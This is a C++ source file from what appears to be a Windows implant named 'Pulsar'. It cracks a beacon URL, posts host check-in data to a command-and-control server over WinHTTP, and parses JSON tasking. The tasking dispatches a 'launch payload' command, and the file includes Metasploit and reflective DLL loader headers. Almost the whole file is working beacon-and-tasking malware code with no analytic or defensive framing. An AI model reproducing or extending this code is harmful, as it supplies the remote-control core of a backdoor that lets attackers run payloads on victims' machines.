#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "PulsarProxyLib.h"
#include "MetasploitLoader.h"
#include "LoadLibraryR.h"
#include "vars.h"
#include "Watcher.h"
#include "creds.h"
#include "jsmn.h"
#include "commands.h"
#include "ProxyCreds.h"

#include <stdlib.h>
#include <time.h>
#include <EventSys.h>
#include <winhttp.h>


//
// Break up the beacon url into the
// host, port, and resource so we
// can correctly reach out to it
//
VOID InitialzeBeaconResources(VOID){
  DBGPrint("Called, parsing %s\n",pulsar_context->beacon_url);


  URL_COMPONENTS urlComp;
    DWORD dwUrlLen = 0;
	DWORD dwSize;

    // Initialize the URL_COMPONENTS structure.
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    // Set required component lengths to non-zero 
    // so that they are cracked.
    urlComp.dwSchemeLength    = (DWORD)-1;
    urlComp.dwHostNameLength  = (DWORD)-1;
    urlComp.dwUrlPathLength   = (DWORD)-1;
    urlComp.dwExtraInfoLength = (DWORD)-1;


	//Convert the URL to unicode
	  const WCHAR *pwcsBeaconURL;
	  int nChars = MultiByteToWideChar(CP_UTF8, 0,pulsar_context->beacon_url , -1, NULL, 0);
	  pwcsBeaconURL = new WCHAR[nChars];
	  MultiByteToWideChar(CP_UTF8, 0, pulsar_context->beacon_url, -1, (LPWSTR)pwcsBeaconURL, nChars);

	  DBGPrint("pwcsBeaconURL: %S\n",pwcsBeaconURL);

    // Crack the URL.
    if (!WinHttpCrackUrl( pwcsBeaconURL, (DWORD)wcslen(pwcsBeaconURL), 0, &urlComp))
    {
        DBGPrint("Error %u in WinHttpCrackUrl.\n", GetLastError());
    }
    else
    {
		DBGPrint("hostname: %d  %S\n",urlComp.dwHostNameLength,urlComp.lpszHostName);
		nChars = urlComp.dwHostNameLength;
		dwSize = (nChars + 1) * sizeof(WCHAR);
		pulsar_context->BeaconHost = (PWCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
		wcsncpy(pulsar_context->BeaconHost,urlComp.lpszHostName,nChars);
		DBGPrint("pulsar_context->BeaconHost: %S\n",pulsar_context->BeaconHost);

		pulsar_context->BeaconPort = urlComp.nPort;
		DBGPrint("port: %d\n",pulsar_context->BeaconPort);

		nChars = urlComp.dwUrlPathLength;
		dwSize = (nChars + 1) * sizeof(WCHAR);
		pulsar_context->BeaconResource = (PWCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
		wcsncpy(pulsar_context->BeaconResource,urlComp.lpszUrlPath,nChars);
		DBGPrint("Resource: %S\n",pulsar_context->BeaconResource);

		if (urlComp.nScheme == INTERNET_SCHEME_HTTPS){
			DBGPrint("Using SSL\n");
			pulsar_context->BeaconFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;
		}
		else{
			DBGPrint("NOT using SSL\n");
			pulsar_context->BeaconFlags = WINHTTP_FLAG_REFRESH;
		}

    }


  delete [] pwcsBeaconURL;

  DBGPrint("Returning\n");

  return;
}







#define TOKEN_STRING(js, t, s) \
	(strncmp(js+(t).start, s, (t).end - (t).start) == 0 \
	 && strlen(s) == (t).end - (t).start)

#define TOKEN_PRINT(t) \
	DBGPrint("start: %d, end: %d, type: %d, size: %d\n", \
			(t).start, (t).end, (t).type, (t).size)


//
// Given a command buffer JSON object, parse out
// the command and arguments and call the appropraite function
//
BOOL ProcessCommand(PCHAR cmd){
	DBGPrint("Called with %s\n",cmd);

	PCHAR cmdBuf = NULL;
	PCHAR argBuf = NULL;
	jsmn_parser p;
	size_t cmdlen = 0;
	jsmntok_t tokens[256];
	int r;
	DWORD dwObjectSize;

	// Prepare parser
	jsmn_init(&p);
	cmdlen = strlen(cmd);
	r = jsmn_parse(&p, (char *)cmd, cmdlen, tokens, 256);
	DBGPrint("There are %d elements\n", r);


	//Walk the objects sorting out the command and arguement
	for(int i = 0; i < r; i++){
		TOKEN_PRINT(tokens[i]);

		//If we see a JSON object we extract and process
		//the command
		if(tokens[i].type == JSMN_STRING){

			//Check if its Command
			if(TOKEN_STRING(cmd,tokens[i],"command") ){
				//Extract the next string
				dwObjectSize = tokens[i+1].end - tokens[i+1].start;
				cmdBuf = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwObjectSize+1);
				memcpy(cmdBuf,cmd + tokens[i+1].start,dwObjectSize);

			}

			//Check if its argument
			if(TOKEN_STRING(cmd,tokens[i],"argument") ){
				//Extract the next string
				dwObjectSize = tokens[i+1].end - tokens[i+1].start;
				argBuf = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwObjectSize+1);
				memcpy(argBuf,cmd + tokens[i+1].start,dwObjectSize);

			}

		}
	}

	//Now invoke the actual command
	DBGPrint("command: %s argument: %s\n",cmdBuf,argBuf);

	//Run the command
	if(strcmpi(cmdBuf,"launch payload") == 0){
		LaunchPayload(argBuf);
	}else if (strcmpi(cmdBuf,"change setting") == 0){
		ChangeSetting(argBuf);
	}else{
		DBGPrint("unknown command\n");
	}


	//Free memory
	if(cmdBuf)
		HeapFree(GetProcessHeap(),0,cmdBuf);

	if(argBuf)
		HeapFree(GetProcessHeap(),0,argBuf);

	DBGPrint("Returning\n");
	return FALSE;
}


//
// Take the results from a beacon
// and process them by sorting through
// the array of commands and handling them
// one by one
//
BOOL ProcessResults(PCHAR json){
	DBGPrint("Called with %s\n",json);
	jsmn_parser p;
	size_t jslen = 0;
	jsmntok_t tokens[256];
	int r;
	DWORD dwObjectSize;

	// Prepare parser
	jsmn_init(&p);
	jslen = strlen(json);
	r = jsmn_parse(&p, (char *)json, jslen, tokens, 256);
	DBGPrint("There are %d elements\n", r);

	for(int i = 0; i < r; i++){
		TOKEN_PRINT(tokens[i]);

		//If we see a JSON object we extract and process
		//the command
		if(tokens[i].type == JSMN_OBJECT){
			//Extract object
			dwObjectSize = (tokens[i].end - tokens[i].start); //We want exact string size
			PCHAR cmd = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwObjectSize+1);  //We allocate for the null
			memcpy(cmd,json + tokens[i].start,dwObjectSize);

			DBGPrint("cmd: %s size: %d\n",cmd,dwObjectSize);

			//Run command
			ProcessCommand(cmd);

			//Free memory
			HeapFree(GetProcessHeap(),0,cmd);

		}
	}

	DBGPrint("Returning\n");
	return FALSE;
}



//
// Perform our first beacon and give our
// settings to the C2 servers
//
PCHAR FirstBeacon(VOID){
  DBGPrint("Called\n");


  //Create JSON for first checkin
	PCHAR JSONInfo = NULL;

	JSONInfo = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,4096);
	if(!JSONInfo){
		DBGPrint("Failed to allocate JSON Buffer\n");
		return NULL;
	}

	sprintf(JSONInfo,"{\"group\": \"%s\",\"beacon_jitter\": %d,\"beacon_interval\": %d,\"relay_port\": %d,\"id\": \"%s\",\"relay_host\": \"%s\"}"
		,pulsar_context->group,pulsar_context->dwBeaconJitter,pulsar_context->dwBeaconTime,pulsar_context->pulsarproxy_port,
		pulsar_context->GUID,pulsar_context->beacon_url);

	DWORD dwOptLen = strlen(JSONInfo);// +1;

	DBGPrint("JSONInfo: %s\n",JSONInfo);
	DBGPrint("dwOptLen: %d\n",dwOptLen);


  //POST info
	HINTERNET hSession = NULL,
			  hConnect = NULL,
			  hRequest = NULL;
	BOOL bResults = FALSE;
	LPSTR pszOutBuffer;
	int offset = 0;
	DWORD dwSize = sizeof(DWORD);
	DWORD dwDownloaded = 0;
	BOOL bSuccess = FALSE;
	DWORD data_out_len;
	char *data_out = NULL; 

	hSession = WinHttpOpen(USER_AGENT,
						   g_meterproxy_config.dwProxyAccessType,
						   (LPCWSTR)g_meterproxy_config.proxy,
						   g_meterproxy_config.proxy_bypass_list,
						   0);
	





	//Set the security flags
	SetHandleProtFlags(hSession);



	hConnect = WinHttpConnect(hSession, pulsar_context->BeaconHost,pulsar_context->BeaconPort, 0);
	if (!hConnect) {
		DBGPrint("hConnect NULL\n");
		goto cleanup;
	}


	hRequest = WinHttpOpenRequest(hConnect, L"POST", pulsar_context->BeaconResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, pulsar_context->BeaconFlags);
	if (!hRequest) {
		DBGPrint("hRequest NULL\n");
		goto cleanup;
	}

	//Set the redirection flags
	SetHandleRedirFlags(hRequest);

	//Set the security flags
	SetHandleCERTFlags(hRequest);



	WCHAR* szHeaders = L"Content-Type:application/json\r\n";


	bResults = WinHttpSendRequest(hRequest, szHeaders, 0, (void *)JSONInfo, dwOptLen, dwOptLen, NULL);
	if (!bResults) {
		DBGPrint("Send Request Failed: 0x%x\n", GetLastError());
		goto cleanup;
	}

	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		DBGPrint("Receive Response Failed: 0x%x\n", GetLastError());
		goto cleanup;
	}


	
  //First lets check the status code
	//First check the response for a valid code 200
	DWORD dwStatusCode;
	bResults = WinHttpQueryHeaders(hRequest,
		WINHTTP_QUERY_STATUS_CODE |
		WINHTTP_QUERY_FLAG_NUMBER,
		NULL,
		&dwStatusCode,
		&dwSize,
		NULL);
	if (!bResults) {
		DBGPrint("Failed to retrieve status code: %d\n", GetLastError());
		DBGPrint("Need %d bytes for results %d\n", dwSize);
		//goto cleanup;
	}
	else{
		DBGPrint("Status code: %d\n", dwStatusCode);
		if (dwStatusCode == 200){
			pulsar_context->firstBeacon = TRUE;
		}
	}
	pulsar_context->firstBeacon = TRUE;


	//Reset dwSize
	dwSize = 0;

  //Process results, response should be [] so not much to do
		// Get the Content-Length header so we can allocate appropriately.
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
	DWORD lastError = GetLastError();
	if (lastError == ERROR_INSUFFICIENT_BUFFER) {
		LPVOID lpOutBuffer = new WCHAR[dwSize/sizeof(WCHAR)];
		WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);
		data_out_len = _wtoi((const wchar_t *)lpOutBuffer);
		DBGPrint("Content-Length: %d\n", data_out_len);
		delete [] lpOutBuffer;
	} else {
		DBGPrint("WinHttpQueryHeaders: %d\n", lastError);
		goto cleanup;
	}

	DBGPrint("data_out_len: %d\n",data_out_len);


	data_out = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, data_out_len+1);

	do {
		dwSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			DBGPrint("WinHttpQueryDataAvailable: %d\n", GetLastError());

		//DBGPrint("File size: %d\n", dwSize);

		pszOutBuffer = new char[dwSize+1];
		if (!pszOutBuffer) {
			DBGPrint("Out of memory\n");
			dwSize = 0;
		} else {
			// Read the data
			ZeroMemory(pszOutBuffer, dwSize+1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				DBGPrint("Error %d in WinHttpReadData\n", GetLastError());

			RtlCopyMemory((char *)(data_out+offset), pszOutBuffer, dwSize);
			offset += dwSize;

			delete []pszOutBuffer;
		}
	} while (dwSize > 0);

	DBGPrint("Data received: %s\n", data_out);



cleanup:




	if(JSONInfo)
		HeapFree(GetProcessHeap(),0,JSONInfo);
	if (hRequest)
		WinHttpCloseHandle(hRequest);
	if (hConnect)
		WinHttpCloseHandle(hConnect);
	if (hSession)
		WinHttpCloseHandle(hSession);



	//Process results
	if (data_out != NULL){
		ProcessResults(data_out);
		HeapFree(GetProcessHeap(), 0, data_out);
	}


  DBGPrint("Returning\n");
  
  return NULL;
}

//
// Perform a beacon and get our
// tasking from the C2 servers
//
PCHAR Beacon(VOID){
  DBGPrint("Called\n");

  //Create JSON for normal checkin
	PCHAR JSONInfo = NULL;

	JSONInfo = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,4096);
	if(!JSONInfo){
		DBGPrint("Failed to allocate JSON Buffer\n");
		return NULL;
	}
	sprintf(JSONInfo,"{\"id\": \"%s\"}", pulsar_context->GUID);

	DWORD dwOptLen = strlen(JSONInfo);

  //POST info
 //POST info
	HINTERNET hSession = NULL,
			  hConnect = NULL,
			  hRequest = NULL;
	BOOL bResults = FALSE;
	LPSTR pszOutBuffer;
	int offset = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	DWORD data_out_len;
	char *data_out = NULL;

	hSession = WinHttpOpen(USER_AGENT,
						   g_meterproxy_config.dwProxyAccessType,
						   (LPCWSTR)g_meterproxy_config.proxy,
						   g_meterproxy_config.proxy_bypass_list,
						   0);
	





	//Set the security flags
	SetHandleProtFlags(hSession);



	hConnect = WinHttpConnect(hSession, pulsar_context->BeaconHost,pulsar_context->BeaconPort, 0);
	if (!hConnect) {
		DBGPrint("hConnect NULL\n");
		goto cleanup;
	}


	hRequest = WinHttpOpenRequest(hConnect, L"POST", pulsar_context->BeaconResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, pulsar_context->BeaconFlags);
	if (!hRequest) {
		DBGPrint("hRequest NULL\n");
		goto cleanup;
	}

	//Set the redirection flags
	SetHandleRedirFlags(hRequest);

	//Set the security flags
	SetHandleCERTFlags(hRequest);

	WCHAR* szHeaders = L"Content-Type:application/json\r\n";
	bResults = WinHttpSendRequest(hRequest, szHeaders, 0, (void *)JSONInfo, dwOptLen, dwOptLen, NULL);
	if (!bResults) {
		DBGPrint("Send Request Failed: 0x%x\n", GetLastError());
		goto cleanup;
	}

	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		DBGPrint("Receive Response Failed: 0x%x\n", GetLastError());
		goto cleanup;
	}


  //Process results, response should be [] so not much to do
		// Get the Content-Length header so we can allocate appropriately.
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
	DWORD lastError = GetLastError();
	if (lastError == ERROR_INSUFFICIENT_BUFFER) {
		LPVOID lpOutBuffer = new WCHAR[dwSize/sizeof(WCHAR)];
		WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);
		data_out_len = _wtoi((const wchar_t *)lpOutBuffer);
		DBGPrint("Content-Length: %d\n", data_out_len);
		delete [] lpOutBuffer;
	} else {
		DBGPrint("WinHttpQueryHeaders: %d\n", lastError);
		goto cleanup;
	}

	DBGPrint("data_out_len: %d\n",data_out_len);

	data_out = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, data_out_len+1);

	do {
		dwSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			DBGPrint("WinHttpQueryDataAvailable: %d\n", GetLastError());

		//DBGPrint("File size: %d\n", dwSize);

		pszOutBuffer = new char[dwSize+1];
		if (!pszOutBuffer) {
			DBGPrint("Out of memory\n");
			dwSize = 0;
		} else {
			// Read the data
			ZeroMemory(pszOutBuffer, dwSize+1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				DBGPrint("Error %d in WinHttpReadData\n", GetLastError());

			RtlCopyMemory((char *)(data_out+offset), pszOutBuffer, dwSize);
			offset += dwSize;

			delete []pszOutBuffer;
		}
	} while (dwSize > 0);

	DBGPrint("Data received: %s\n", data_out);


cleanup:

	if(JSONInfo)
		HeapFree(GetProcessHeap(),0,JSONInfo);
	if (hRequest)
		WinHttpCloseHandle(hRequest);
	if (hConnect)
		WinHttpCloseHandle(hConnect);
	if (hSession)
		WinHttpCloseHandle(hSession);



  //Process results
	if (data_out){
		ProcessResults(data_out);
		HeapFree(GetProcessHeap(), 0, data_out);
	}


  DBGPrint("Returning\n");
  return NULL;
}


//
//Perform a basic "Beacon" and 
//respond to the results from the 
//C2 server
//
VOID BeaconAndProcess(VOID){

  DBGPrint("Called\n");

  if(pulsar_context->firstBeacon == FALSE){
	FirstBeacon();
  }else{
	 Beacon();
  }


  DBGPrint("Returning\n");


}